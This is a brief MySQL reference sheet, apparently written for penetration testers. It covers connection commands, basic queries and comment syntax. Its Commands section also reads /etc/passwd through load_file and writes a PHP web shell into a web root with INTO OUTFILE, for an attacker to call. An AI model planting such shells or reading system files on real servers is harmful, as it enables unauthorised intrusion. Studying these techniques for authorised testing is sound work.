
## Overview
---
**MySQL** is an open-source relational database management system. It is widely used for storing and managing data in various applications, providing a robust and scalable solution for database needs.

- Default Port: **3306**

## Usage
---

### Connecting to Databases

```shell
# Connect to a local database (prompt for password)
mysql -u <username> -p

# Connect to a remote database (prompt for password)
mysql -h <ip_addr> -u <username> -p

# Connect to a remote database port forwarded to 127.0.0.1:3306
mysql -h 127.0.0.1 -u <username> -p
```

### Commands

```mysql
-- General Usage
show databases;
use <database>;
show tables;
describe <table>;
show columns from <table>;
select * from <table>;
select <column>,<column>,<column> from <table>;

-- Read File (need FILE privileges to read/write to files)
select load_file('/etc/passwd');

-- Write File (need FILE privileges to read/write to files)
select 1,2,"Hello World",4 into OUTFILE '/tmp/testing.txt'

-- Advanced: Write a PHP reverse shell to an LFI Location
select 1,2,"<?php echo shell_exec($_GET['c']);?>",4 into OUTFILE 'C:/xampp/htdocs/revshell.php'
-- Attacker then navigates to 'http://<ip_addr>:<port>/revshell.php'
```

### Comments

```mysql
-- This is a single-line comment

/*
This is a multi-line comment
*/
```